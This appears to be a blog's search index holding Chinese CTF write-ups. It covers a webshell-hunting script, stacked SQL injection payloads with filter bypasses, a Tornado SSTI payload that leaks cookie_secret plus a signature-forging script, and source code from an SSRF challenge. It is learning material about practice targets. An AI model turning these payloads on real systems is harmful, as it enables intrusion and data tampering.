<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>强网杯高明的黑客</title>
      <link href="/2019/11/14/qiang-wang-bei-gao-ming-de-hei-ke/"/>
      <url>/2019/11/14/qiang-wang-bei-gao-ming-de-hei-ke/</url>
      
        <content type="html"><![CDATA[<p>下载源码，写脚本遍历出可以利用的shell，cat flag</p><p>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Poolpath <span class="token operator">=</span> <span class="token string">"C:/Users/26624/Desktop/www/src"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print files</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/src/"</span><span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    gets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>f<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        lines <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">]</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                start_pos <span class="token operator">=</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">+</span> len<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span>                end_pos <span class="token operator">=</span> line<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span>                gets<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">[</span>start_pos<span class="token punctuation">:</span>end_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> gets<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        gets <span class="token operator">=</span> extract<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"try: %s"</span> <span class="token operator">%</span> filename        <span class="token keyword">for</span> get <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            new_url <span class="token operator">=</span> <span class="token string">"%s%s?%s=%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>url<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> get<span class="token punctuation">,</span> <span class="token string">'echo "got it"'</span><span class="token punctuation">)</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>new_url<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'got it'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>                <span class="token keyword">print</span> new_url                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pool <span class="token operator">=</span> Pool<span class="token punctuation">(</span>processes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pool<span class="token punctuation">.</span>apply_async<span class="token punctuation">(</span>exp<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">+</span>len<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>线程和find，os库的使用，思路就是用找到所有get方式传递变量的可以执行的shell,get传参测试数据，例如go it ,然后，cat/flag,用线程可以缩短脚本运行时间。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 高明的黑客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2019/11/09/dui-die-zhu-ru/"/>
      <url>/2019/11/09/dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="强网杯随便注"><a href="#强网杯随便注" class="headerlink" title="强网杯随便注"></a>强网杯随便注</h3><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1'order by 3%23</span></code></pre><p>首先测试order by 3，发现没有三列</p><img src="/2019/11/09/dui-die-zhu-ru/2.png"><p>尝试<code>order by 2</code>,回显正常</p><p>尝试使用联合查询</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1'union select 1,database()%23</span></code></pre><p>发现显示了过滤机制</p><img src="/2019/11/09/dui-die-zhu-ru/3.png"><p>过滤了select，这对注入操作难了不少，直接注入估计十分困难</p><p>这时候考虑堆叠注入，语句以分号结尾，就好像是mysql语句中的；的分割，尝试堆叠注入。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show tables%23</span></code></pre><p>发现了两张表，分别为<code>words</code>和<code>1919810931114514</code></p><p>用show语句对words先进行查询</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show columns from words%23</span></code></pre><p>发现存在id和data字段，猜测默认查询的数据库就是words了</p><img src="/2019/11/09/dui-die-zhu-ru/4.png"><p>查询<code>1919810931114514</code>表</p><p>注意，查询表名全为数字的表时，要加反引号</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//5bd04c33-fbd9-47fb-a7ee-481b9c0b1324.node3.buuoj.cn/?inject=1';show columns from `1919810931114514`%23</span></code></pre><img src="/2019/11/09/dui-die-zhu-ru/5.png"><p>flag在1919810931114514的表中，默认查询为words表中的字段，联合查询的语句被过滤，但是并没有过滤rename1和alert,我们可以对words表进行改名为其他，然后flag所在的表改为words，在表中添加id字段，将flag改名为data,再次查询，得到结果。</p><hr><p>1.将words表改名为word1或其它任意名字</p><p>2.1919810931114514改名为words</p><p>3.将新的word表插入一列，列名为id</p><p>4.将flag列改名为data</p><hr><p>构造payload:</p><pre class=" language-sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">rename</span> <span class="token keyword">to</span> word<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span><span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">rename</span> <span class="token keyword">to</span> words<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag <span class="token keyword">data</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">add</span> <span class="token keyword">column</span> id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">--+</span></code></pre><p>直接查询1,得到flag</p><img src="/2019/11/09/dui-die-zhu-ru/6.png"><p>或者：</p><pre class=" language-sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">RENAME</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">TO</span> <span class="token punctuation">`</span>words1<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">RENAME</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">TO</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> CHANGE <span class="token punctuation">`</span>flag<span class="token punctuation">`</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查询1’or 1=1%23</p><p>得到flag,但是这个payload 并不太懂，先记录一下</p><p><strong>还有个注法：</strong></p><p>大佬wp展示了一手存储过程绕过</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//web16.buuoj.cn/?inject=1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</span>使用了大小写绕过strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> strstr<span class="token punctuation">(</span>$inject<span class="token punctuation">,</span> <span class="token string">"prepare"</span><span class="token punctuation">)</span>去掉URL编码后?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span>prepare execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。</p><p>hex(select * from `1919810931114514`)=</p><p>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</p><h3 id="suctf-easy-sql"><a href="#suctf-easy-sql" class="headerlink" title="suctf easy sql"></a>suctf easy sql</h3><p>这次打开题目，发现这次是post注入，输入1看看。</p><img src="/2019/11/09/dui-die-zhu-ru/7.png"><p>检验发现会出现三种结果</p><hr><ol><li>Nonono.</li><li>空</li><li>出现array,回显</li></ol><hr><p>当出现被过滤字符时，就会出现出现Nonono,测试被过滤的有or ,from, union, updatexml, extractvalue,where ,if等</p><p>测试堆叠注入</p><pre class=" language-sql"><code class="language-sql">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">23</span></code></pre><img src="/2019/11/09/dui-die-zhu-ru/8.png"><p>  发现了Flag表，select查询表名几乎不可能，过滤了太多当前库只有一个Flag表，而且语句长度限制了40位，所以想要像强网一样的改表面和预编译的操作都不可以了，并且过滤了from等等</p><p>猜测有flag字段，因为flag被过滤了，不能对它进行改名操作了</p><p>预期解：</p><p>通过堆叠注入sql_mode的值为PIPES_AS_CONCAT，设置sql_mode为PIPES_AS_CONCAT后可改变’||’的含义为连接字符串，在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能</p><p>改变语义后就是将前一个字段的查询结果和后一个字段查询结果进行拼接。这样两个字段都会被查询<br>构造payload：<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><img src="/2019/11/09/dui-die-zhu-ru/9.png"><p>非预期解</p><p>输入*,1</p><p>原sql语句变为<br><code>select *,1||flag from Flag</code></p><p>也能得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅尝ssti</title>
      <link href="/2019/11/07/qian-chang-ssti/"/>
      <url>/2019/11/07/qian-chang-ssti/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p>进入题目，发现了三个文件目录</p><img src="/2019/11/07/qian-chang-ssti/1.png"><p>点开flag.txt显示的是文件的路径是/fllllllllllllag</p><img src="/2019/11/07/qian-chang-ssti/2.png"><p>点开welcome.txt,发现了render，说明这个网页的框架使用的是render函数</p><p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a></p><p><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado</a></p><p>打开hint.txt,发现了认证的方式：md5(cookie_secret+md5(filename))</p><img src="/2019/11/07/qian-chang-ssti/4.png"><p>抓包试试，看看是否可以成功访问到</p><img src="/2019/11/07/qian-chang-ssti/5.png"><p>结果显示为error?msg=errror</p><p><strong>这时候有render函数的渲染，msg返回消息error,尝试ssti模板注入</strong></p><p><code>/error?msg=1</code></p><img src="/2019/11/07/qian-chang-ssti/6.png"><p>发现确实存在模板注入，试试存在内部运算</p><p><code>/error?msg=49</code></p><img src="/2019/11/07/qian-chang-ssti/7.png"><p>返回值不为49,内部运算不存在</p><p>尝试<code>/error?msg=</code></p><img src="/2019/11/07/qian-chang-ssti/8.png"><p>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p><p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings" target="_blank" rel="noopener">别名</a></p><pre class=" language-python"><code class="language-python">RequestHandler<span class="token punctuation">.</span>settingsAn alias <span class="token keyword">for</span> self<span class="token punctuation">.</span>application<span class="token punctuation">.</span>settings<span class="token punctuation">.</span></code></pre><p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings</p><p>构造payload获取cookie_secret</p><pre class=" language-python"><code class="language-python"><span class="token operator">/</span>error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><img src="/2019/11/07/qian-chang-ssti/9.png"><p>写脚本，构造sign</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibcookie_secret<span class="token operator">=</span><span class="token string">'c08d4732-963e-46de-920f-72f3c7379b52'</span><span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    new_md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    new_md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> new_md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>    pay<span class="token operator">=</span>md<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    payload<span class="token operator">=</span>md<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>pay<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>payload</p><pre><code>filename=/fllllllllllllag&amp;filehash=f5922def8ba1f4799a070652d2975770</code></pre><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfb wp部分</title>
      <link href="/2019/11/06/wp-bu-fen/"/>
      <url>/2019/11/06/wp-bu-fen/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="SSRF-me"><a href="#SSRF-me" class="headerlink" title="SSRF me"></a>SSRF me</h4><p>题目给出乱的源码，查看网页源码还原为：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> jsonreload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#SandBox For Remote_Addr</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#generate Sign For Action Scan.</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span 